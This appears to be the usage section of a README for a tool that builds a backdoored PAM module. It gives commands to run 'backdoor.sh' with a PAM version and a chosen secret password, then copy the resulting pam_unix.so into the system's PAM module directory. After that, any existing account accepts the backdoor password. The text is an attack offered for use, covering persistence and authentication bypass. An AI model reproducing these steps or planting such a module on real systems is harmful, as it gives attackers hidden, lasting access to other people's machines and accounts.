=================================================================================================================================================================================


To generate the backdoored pam_unix.so, just run:
```
./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd
```

You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.

After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 

```
cp pam_unix.so /usr/lib/security/
```

That's all. 

After that, you can log-in to the system using an existing user, and the previously configured password.
